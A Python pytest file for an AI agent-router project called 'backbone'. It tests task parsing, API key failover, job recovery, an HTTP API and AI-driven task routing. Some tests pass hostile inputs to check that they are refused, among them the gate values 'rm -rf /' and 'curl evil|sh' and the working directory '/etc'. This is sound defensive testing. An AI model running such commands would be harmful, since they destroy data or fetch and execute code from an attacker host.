import os
import sys
import threading
import time

import pytest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from backbone import library
from backbone.core import Backbone, parse, norm_worker, load_config
from backbone.db import connect
from backbone.keys import KeyPool, Transient
from backbone.workers import Result
from backbone.workspace import scratch_repo


def test_parse_grammar():
    t = parse("/review #hermes-ui @nim2 check the login flow")
    assert (t.command, t.project, t.worker, t.prompt) == ("review", "hermes-ui", "nim2", "check the login flow")
    t = parse("fix the bug /not-a-command")
    assert t.command == "" and t.prompt == "fix the bug /not-a-command"
    assert norm_worker("nim3") == "pi:NIM_3" and norm_worker("claude") == "claude" and norm_worker("") == ""


def test_library_ingest_and_search(tmp_path):
    (tmp_path / "copywriting").mkdir()
    (tmp_path / "copywriting" / "SKILL.md").write_text("---\nname: copywriting\ndescription: >\n  Write landing page copy\n  and headlines.\n---\nBody about hooks.")
    (tmp_path / "cmds").mkdir()
    (tmp_path / "cmds" / "ship.md").write_text("---\nname: ship\ndescription: deploy checklist\nworker: codex\n---\nRun the checklist: $ARGUMENTS")
    con = connect(str(tmp_path / "t.db"))
    assert library.ingest_dir(con, str(tmp_path / "copywriting"), "skill") == 1
    assert library.ingest_dir(con, str(tmp_path / "cmds"), "command") == 1
    hits = library.search(con, "landing page headline copy")
    assert hits and hits[0]["name"] == "copywriting"
    assert library.get(con, "command", "ship")["meta"]["worker"] == "codex"
    assert library.counts(con) == {"skill": 1, "command": 1}


def test_keypool_failover_and_cap():
    pool = KeyPool(["NIM_1", "NIM_2", "NIM_3"], max_concurrent=1, cooldown_s=60, env={"NIM_1": "a", "NIM_2": "b", "NIM_3": "c"})
    seen = []

    def fn(name, key):
        seen.append(name)
        if name == "NIM_1":
            raise Transient("503")
        return name

    assert pool.call(fn, prefer="NIM_1", retries=1, backoff_s=0) in ("NIM_2", "NIM_3")
    assert seen[0] == "NIM_1" and pool.status()["NIM_1"]["cooling_s"] > 0
    # cap: with max_concurrent=1 two threads on one key must serialize onto different keys
    held = []
    gate = threading.Event()

    def slow(name, key):
        held.append(name)
        gate.wait(1)
        return name

    ts = [threading.Thread(target=lambda: pool.call(slow, prefer="NIM_2", retries=0)) for _ in range(2)]
    [t.start() for t in ts]
    time.sleep(0.4)
    assert len(set(held)) == 2
    gate.set()
    [t.join() for t in ts]


def test_missing_keys_reported():
    pool = KeyPool(["NIM_1", "NIM_2"], env={"NIM_1": "a"})
    assert pool.names == ["NIM_1"] and pool.status()["NIM_2"]["present"] is False


@pytest.fixture
def bb(tmp_path):
    cfg = load_config()
    cfg["db"] = str(tmp_path / "bb.db")
    cfg["tickets_dir"] = str(tmp_path / "tickets")
    cfg["runs_dir"] = str(tmp_path / "runs")
    cfg["work_dir"] = str(tmp_path / "work")
    cfg["context"] = {"budget_tokens": 600, "summarize_over_tokens": 150, "keep_recent_turns": 2, "vault_query": "/nonexistent"}
    return Backbone(cfg, env={"NIM_1": "a", "NIM_2": "b", "NIM_3": "c"})


def test_context_fold_and_pack_budget(bb):
    sid = bb.sessions.open(None, "p")
    for i in range(8):
        bb.sessions.add_turn(sid, "user" if i % 2 == 0 else "assistant", f"turn {i} " + "word " * 60)
    assert bb.sessions.maybe_fold(sid, lambda t: "SUMMARY of early turns") is True
    packed = bb.sessions.pack(sid, "what next?", pinned="Project X", use_vault=False)
    assert "SUMMARY of early turns" in packed and "turn 7" in packed and "turn 0" not in packed
    assert len(packed) // 4 <= 700


def test_run_gate_pass_fail_and_ticket(bb):
    repo = scratch_repo()
    calls = []

    def fake(spec, prompt, cwd, read_only, attempt):
        calls.append(spec)
        if spec.startswith("pi"):
            return Result(True, "claimed done", spec, "NIM_1")
        open(os.path.join(cwd, "ok.txt"), "w").write("x")
        return Result(True, "expert did it", spec)

    bb._dispatch = fake
    r = bb.run("do it", cwd=repo, gate="test -f ok.txt", worker="nim1", escalate="codex")
    assert r["state"] == "done" and r["verified"] and calls == ["pi:NIM_1", "pi:NIM_1", "codex"]
    assert "ok.txt" in open(r["patch"]).read()

    r2 = bb.run("do it", cwd=repo, gate="test -f never.txt", worker="nim1", escalate="")
    assert r2["state"] == "blocked" and os.path.exists(r2["ticket"]) and not r2["verified"]

    r3 = bb.run("no gate", cwd=repo, worker="nim1", escalate="")
    assert r3["state"] == "done" and r3["verified"] is False and r3["unverified_reason"] == "no gate"


def test_stale_run_recovery(bb):
    rid = bb.runs.create("s", "", "", "long task", "pi:NIM_1")
    bb.con.execute("UPDATE runs SET lease_until=0 WHERE id=?", (rid,))
    bb.con.commit()
    out = bb.resume_stale()
    assert out and out[0]["run"] == rid and os.path.exists(out[0]["ticket"])
    assert bb.runs.get(rid)["state"] == "blocked"


def test_parallel_runs_share_db_without_crash(bb):
    """Regression: unlocked shared sqlite connection segfaulted (exit 139) under parallel fan-out."""
    repo = scratch_repo()
    bb._dispatch = lambda spec, prompt, cwd, ro, attempt: Result(True, "ok", spec, "NIM_1")
    res = bb.fanout([f"task {i}" for i in range(12)], cwd=repo, gate="true")
    assert len(res) == 12 and all(r["state"] == "done" for r in res)
    assert len({r["run"] for r in res}) == 12


def test_jobs_submit_tick_and_orphan_requeue(bb):
    from backbone.jobs import Jobs
    repo = scratch_repo()
    bb._dispatch = lambda spec, prompt, cwd, ro, attempt: Result(True, "ok", spec, "NIM_1")
    jobs = Jobs(bb)
    jid = jobs.submit("do a thing", cwd=repo, gate="true")
    assert jobs.tick(wait=True) == 1
    assert [j for j in jobs.list() if j["id"] == jid][0]["state"] == "done"
    # a dead daemon left a job running: a new daemon instance requeues it, then blocks after MAX_ATTEMPTS
    j2 = jobs.submit("orphan", cwd=repo)
    bb.con.execute("UPDATE jobs SET state='running', owner='dead', attempts=1 WHERE id=?", (j2,)); bb.con.commit()
    assert Jobs(bb).adopt_orphans() == 1
    assert [j for j in jobs.list() if j["id"] == j2][0]["state"] == "pending"
    bb.con.execute("UPDATE jobs SET state='running', owner='dead', attempts=2 WHERE id=?", (j2,)); bb.con.commit()
    Jobs(bb).adopt_orphans()
    assert [j for j in jobs.list() if j["id"] == j2][0]["state"] == "blocked"


# ---- regressions from the Codex review (2026-11-12) ----
def test_mcp_boundary_refuses_outside_roots_and_unknown_gates(bb):
    import pytest as _p
    with _p.raises(PermissionError):
        bb.check_cwd("/etc")
    with _p.raises(PermissionError):
        bb.named_gate("rm -rf /")
    assert bb.named_gate("noop") == "true"
    assert bb.check_cwd(os.path.expanduser("~/Developer/agent-router")).endswith("agent-router")


def test_pi_read_only_gets_read_tool_only(bb, monkeypatch):
    import backbone.workers as W
    seen = {}

    def fake_run(cmd, cwd, env, timeout):
        seen["cmd"] = cmd
        import subprocess
        return subprocess.CompletedProcess(cmd, 0, "fine", "")

    monkeypatch.setattr(W, "_run", fake_run)
    r = bb.pi.run("review this", os.getcwd(), bb.pool, prefer="NIM_1", read_only=True)
    assert r.ok and "--tools" in seen["cmd"] and seen["cmd"][seen["cmd"].index("--tools") + 1] == "read"


def test_isolation_fails_closed_on_non_git(bb, tmp_path):
    r = bb.run("x", cwd=str(tmp_path), worker="nim1", escalate="")
    assert r["state"] == "failed" and "not a git repo" in r["error"]


def test_patch_survives_unexpected_failure(bb):
    repo = scratch_repo()

    def boom(spec, prompt, cwd, ro, attempt):
        open(os.path.join(cwd, "partial.txt"), "w").write("work")
        raise RuntimeError("db exploded")

    bb._dispatch = boom
    r = bb.run("x", cwd=repo, worker="nim1", escalate="")
    assert r["state"] == "failed" and "partial.txt" in open(r["patch"]).read()


def test_completed_run_not_repeated_after_daemon_death(bb):
    from backbone.jobs import Jobs
    jobs = Jobs(bb)
    jid = jobs.submit("already finished")
    rid = bb.runs.create("s", "", "", "already finished", "pi:NIM_1")
    bb.runs.set(rid, "done")
    bb.con.execute("UPDATE jobs SET state='running', owner='dead', attempts=1, run_id=? WHERE id=?", (rid, jid)); bb.con.commit()
    Jobs(bb).adopt_orphans()
    assert [j for j in jobs.list() if j["id"] == jid][0]["state"] == "done"


def test_key_failover_reaches_third_key():
    pool = KeyPool(["NIM_1", "NIM_2", "NIM_3"], max_concurrent=2, env={"NIM_1": "a", "NIM_2": "b", "NIM_3": "c"})

    def fn(name, key):
        if name != "NIM_3":
            raise Transient("503")
        return name

    assert pool.call(fn, prefer="NIM_1", retries=1, backoff_s=0) == "NIM_3"


def test_context_budget_is_enforced_for_huge_task(bb):
    sid = bb.sessions.open(None, "p")
    packed = bb.sessions.pack(sid, "word " * 5000, pinned="x" * 4000, use_vault=False)
    assert len(packed) // 4 <= bb.sessions.budget + 20


def test_gate_timeout_kills_process_group():
    from backbone.workspace import run_gate
    t = time.time()
    ok, out = run_gate("sleep 20 & sleep 20", os.getcwd(), timeout=1)
    assert not ok and "timeout" in out and time.time() - t < 6


def test_style_mode_and_hooks(bb, tmp_path):
    repo = scratch_repo()
    seen = {}
    marker = tmp_path / "hook.txt"
    bb.cfg["hooks"] = {"pre_run": [f"echo $EVENT:$MODE > {marker}"]}

    def fake(spec, prompt, cwd, ro, attempt):
        seen["prompt"] = prompt
        return Result(True, "ok", spec, "NIM_1")

    bb._dispatch = fake
    r = bb.run("do x", cwd=repo, worker="nim1")
    assert r["mode"] == "single" and "Output style: Terse" in seen["prompt"]
    assert marker.read_text().strip() == "pre_run:single"
    r = bb.run("do x", cwd=repo, worker="nim1", gate="true")
    assert r["mode"] == "loop"
    from backbone.core import norm_worker
    assert norm_worker("or") == "or:" and norm_worker("or:google/gemma-4-31b-it:free") == "or:google/gemma-4-31b-it:free"


def test_graph_resume_does_not_repeat_completed_work(bb, monkeypatch):
    import backbone.graph as G
    repo = scratch_repo()
    calls = []

    def fake(spec, prompt, cwd, ro, attempt):
        calls.append(spec)
        open(os.path.join(cwd, "ok.txt"), "w").write("x")
        return Result(True, "done", spec, "NIM_1")

    bb._dispatch = fake
    real = G.run_gate
    state = {"boom": True}

    def flaky(cmd, cwd, timeout=180):
        if state["boom"]:
            state["boom"] = False
            raise RuntimeError("process died mid-check")
        return real(cmd, cwd, timeout)

    monkeypatch.setattr(G, "run_gate", flaky)
    r = bb.run("do it", cwd=repo, gate="test -f ok.txt", worker="nim1", escalate="")
    assert r["state"] == "failed" and calls == ["pi:NIM_1"]
    r2 = bb.resume(r["run"])
    assert r2["state"] == "done" and r2["verified"] and calls == ["pi:NIM_1"]  # worker NOT re-run
    assert "ok.txt" in open(r2["patch"]).read()


def test_rag_fuses_dense_and_bm25(bb, monkeypatch):
    import backbone.rag as R
    for n, d in [("copywriting", "write landing page copy headlines"), ("cold-email", "outbound email to prospects"),
                 ("seo", "search rankings keywords")]:
        library.upsert(bb.con, "skill", n, d, d, {}, n)
    vocab = {"copywriting": [1, 0, 0], "cold-email": [0, 1, 0], "seo": [0, 0, 1]}

    def fake_post(pool, base, model, texts, kind):
        out = []
        for t in texts:
            v = [0, 0, 0]
            if "headline" in t or "persuasive" in t or "copywriting" in t:
                v[0] = 1
            if "email" in t:
                v[1] = 1
            if "keywords" in t or "rankings" in t:
                v[2] = 1
            out.append(v)
        return out

    monkeypatch.setattr(R, "_post", fake_post)
    assert bb.rag.embed_missing() == 3
    hits = bb.rag.search("persuasive words for my homepage", k=2)  # no lexical overlap with any doc
    assert hits[0]["name"] == "copywriting" and hits[0]["via"] == "dense"


def test_orphaned_job_resumes_checkpoint_instead_of_new_run(bb, monkeypatch):
    import backbone.graph as G
    from backbone.jobs import Jobs
    repo = scratch_repo()
    calls = []
    bb._dispatch = lambda spec, prompt, cwd, ro, attempt: (calls.append(1), open(os.path.join(cwd, "o.txt"), "w").write("x"), Result(True, "ok", spec))[2]
    real = G.run_gate
    boom = {"on": True}

    def flaky(cmd, cwd, timeout=180):
        if boom["on"]:
            boom["on"] = False
            raise RuntimeError("daemon died")
        return real(cmd, cwd, timeout)

    monkeypatch.setattr(G, "run_gate", flaky)
    jobs = Jobs(bb)
    jid = jobs.submit("x", cwd=repo, gate="test -f o.txt", worker="nim1", escalate="")
    jobs.tick(wait=True)  # first execution dies in check -> failed run, job blocked
    bb.con.execute("UPDATE jobs SET state='pending' WHERE id=?", (jid,)); bb.con.commit()
    jobs.tick(wait=True)
    assert [j for j in jobs.list() if j["id"] == jid][0]["state"] == "done" and len(calls) == 1


def test_http_api_auth_gates_and_submit(bb):
    import json as _j, threading, urllib.request, urllib.error
    from http.server import ThreadingHTTPServer
    from backbone.serve import make_handler
    srv = ThreadingHTTPServer(("127.0.0.1", 0), make_handler(bb, "t" * 20))
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    base = f"http://127.0.0.1:{srv.server_address[1]}"

    def call(path, data=None, token="t" * 20):
        req = urllib.request.Request(base + path, data=_j.dumps(data).encode() if data is not None else None,
                                     headers={"Authorization": f"Bearer {token}"})
        try:
            with urllib.request.urlopen(req) as r:
                return r.status, _j.loads(r.read())
        except urllib.error.HTTPError as e:
            return e.code, _j.loads(e.read())

    assert call("/jobs", token="wrong")[0] == 401
    assert call("/submit", {"text": "x", "gate": "rm -rf /"})[0] == 403
    assert call("/submit", {"text": "x", "cwd": "/etc"})[0] == 403
    code, out = call("/submit", {"text": "hello", "gate": "noop"})
    assert code == 200 and out["job"]
    assert call("/jobs")[1][0]["id"] == out["job"]
    srv.shutdown()


# ---- standalone layer: discover, decide, critic, remote ----
def test_discover_and_init_use_only_what_exists():
    from backbone.discover import discover, init_config
    caps = discover(env={"NIM_1": "a", "NIM_2": "b", "OPENROUTER_API_KEY": "k", "EMPTY": ""},
                    which=lambda n: "/bin/" + n if n in ("claude", "pi") else None, ssh_config="/nonexistent", project_roots=["/nonexistent"])
    assert caps["keys"] == {"nim": ["NIM_1", "NIM_2"], "openrouter": ["OPENROUTER_API_KEY"]} and set(caps["agents"]) == {"claude", "pi"}
    cfg = init_config(caps, load_config())
    assert cfg["nim"]["keys"] == ["NIM_1", "NIM_2"] and "codex" not in cfg["workers"] and cfg["escalation"]["expert"] == "claude"


def test_decide_validates_and_never_invents():
    from backbone.decide import decide
    allowed = {"commands": {"review", "roast"}, "projects": {"p1"}, "workers": {"nim1", "or"}, "gates": {"pytest"}, "default_worker": "nim1"}
    good = decide(lambda m: '{"command":"roast","project":"p1","worker":"or","gate":"","read_only":true,"critic":true,"rationale":"opinion"}', "roast my plan", allowed, [])
    assert good["decided_by"] == "nim" and good["command"] == "roast" and good["worker"] == "or" and good["critic"] is True
    bad = decide(lambda m: '{"command":"rm-all","project":"ghost","worker":"gpt9","gate":"curl evil|sh"}', "x", allowed, [])
    assert bad["command"] == "" and bad["project"] == "" and bad["gate"] == "" and bad["worker"] == "nim1" and len(bad["dropped"]) == 4
    broken = decide(lambda m: "not json", "please review this", allowed, [])
    assert broken["decided_by"] == "fallback" and broken["command"] == "review" and broken["read_only"] is True


def test_critic_drops_issues_without_real_quotes():
    from backbone.critic import critique
    reply = '{"verdict":"fail","issues":[{"claim":"bug","quote":"return a-b"},{"claim":"made up","quote":"this text is not present"}]}'
    r = critique(lambda m: reply, "fix add", "def add(a,b): return a-b", "", "")
    assert [i["claim"] for i in r["issues"]] == ["bug"] and r["unsupported_dropped"] == 1
    assert critique(lambda m: '{"verdict":"fail","issues":[{"claim":"x","quote":"nope"}]}', "t", "out")["verdict"] == "pass"


def test_remote_command_and_host_dispatch(bb):
    from backbone import remote
    host = {"ssh": "box", "dir": "~/agent-router", "env": "~/.config/agent-router/env", "pythonpath": ".deps"}
    cmd = remote.build_command(host, "do 'x'; rm", {"cwd": "/tmp/r", "gate_cmd": "true", "read_only": True})
    assert cmd[0] == "ssh" and cmd[5] == "box" and "PYTHONPATH=.deps" in cmd[-1] and "'do '\"'\"'x'\"'\"'; rm'" in cmd[-1]
    import subprocess
    out = remote.run(host, "hi", {}, runner=lambda c, **k: subprocess.CompletedProcess(c, 0, 'noise\n{"state":"done","run":"r1"}', ""))
    assert out["state"] == "done" and out["host"] == "box"
    bb.cfg["hosts"] = {"oracle": host}
    assert bb.run("hi", worker="host:nope")["state"] == "failed"


def test_decider_cannot_pick_experts_by_default(bb):
    assert not ({"claude", "codex"} & bb.allowed()["workers"])
    bb.cfg["decide"] = {"allow_experts": True}
    assert bb.allowed()["workers"] >= {"nim1"}


def test_prompt_comes_from_library_with_provenance(bb, monkeypatch):
    import backbone.rag as R
    library.upsert(bb.con, "skill", "cold-email", "write cold outbound email", "STEP ONE: research the prospect. STEP TWO: one clear ask.", {}, "x")
    library.upsert(bb.con, "command", "build", "implement", "Implement: $ARGUMENTS", {"worker": "nim1"}, "y")
    monkeypatch.setattr(R, "_post", lambda *a, **k: [[1.0, 0.0] for _ in a[3]])
    bb.rag.embed_missing()
    repo = scratch_repo()
    seen = {}
    bb._dispatch = lambda spec, prompt, cwd, ro, att: (seen.update(p=prompt), Result(True, "ok", spec))[1]
    r = bb.run("/build write a cold outbound email to a prospect", cwd=repo, worker="nim1")
    how = {s["name"]: s["how"] for s in r["prompt_sources"]}
    assert how["build"] == "command-template" and how.get("cold-email") == "body-injected"
    assert "STEP ONE: research the prospect" in seen["p"] and "Implement: write a cold" in seen["p"]


def test_doctor_reports_usable_vs_broken(tmp_path):
    from backbone import doctor
    import json as _j
    good = tmp_path / "good"; good.write_text("#!/bin/sh\necho ok\n"); good.chmod(0o755)
    bad = tmp_path / "bad"; bad.write_text("#!/bin/sh\necho 'please log in' >&2; exit 1\n"); bad.chmod(0o755)
    res = doctor.run({"qwen": str(good), "gemini": str(bad), "mystery": str(good)}, str(tmp_path), str(tmp_path / "caps.json"))
    by = {r["name"]: r for r in res["agents"]}
    assert by["qwen"]["usable"] is True and by["gemini"]["usable"] is False and "log in" in by["gemini"]["note"]
    assert by["mystery"]["usable"] is None and _j.load(open(tmp_path / "caps.json"))["agents"]
